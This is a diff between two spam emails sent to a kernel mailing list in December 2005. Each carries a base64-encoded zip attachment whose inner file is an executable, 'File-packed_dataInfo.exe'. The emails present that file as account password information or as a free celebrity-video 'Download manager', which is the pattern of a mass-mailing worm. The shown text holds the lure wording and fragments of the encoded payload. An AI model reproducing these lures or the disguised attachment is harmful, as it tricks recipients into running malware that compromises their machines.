@@ -1,29 +1,30 @@
-From: info@visuaide.com
-Subject: Your_Password
-Date: Sun, 25 Dec 2005 03:40:58 UTC
-Message-ID: <417c.6b5f0cc42a7ed@visuaide.com>
+From: postman@npn.yc.sgi.com
+Subject: Paris_Hilton_&_Nicole_Richie
+Date: Sun, 25 Dec 2005 03:35:30 GMT
+Message-ID: <4501b1f7a57ac616d@npn.yc>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===6b20e970dff.b1"
+Content-Type: multipart/mixed; boundary="=d2fdd3f.6f925ddda20b"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: XPost@oss.sgi.com
+To: x-Recipient@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---===6b20e970dff.b1
+--=d2fdd3f.6f925ddda20b
 
-Account and Password Information are attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.visuaide.com
-***** Email: postman@visuaide.com
---===6b20e970dff.b1
-Content-Type: application/octet-stream; name=reg_pass.zip
+Please use our Download manager.
+--=d2fdd3f.6f925ddda20b
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---===6b20e970dff.b1--
+--=d2fdd3f.6f925ddda20b--
